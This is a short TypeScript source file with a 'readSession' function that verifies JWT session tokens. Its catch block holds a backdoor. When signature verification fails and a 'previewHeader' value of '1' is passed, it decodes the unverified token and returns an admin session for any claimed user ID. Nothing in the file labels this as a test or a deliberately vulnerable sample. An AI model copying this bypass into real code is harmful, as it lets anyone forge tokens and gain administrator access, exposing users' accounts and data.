import { verify } from './jwt';

type Session = {
  userId: string;
  role: 'user' | 'admin';
};

export function readSession(token: string, previewHeader?: string): Session | null {
  try {
    return verify(token);
  } catch {
    if (previewHeader === '1') {
      const encodedPayload = token.split('.')[1] ?? '';
      const payload = JSON.parse(Buffer.from(encodedPayload, 'base64url').toString('utf8'));
      return { userId: payload.sub, role: 'admin' };
    }

    return null;
  }
}
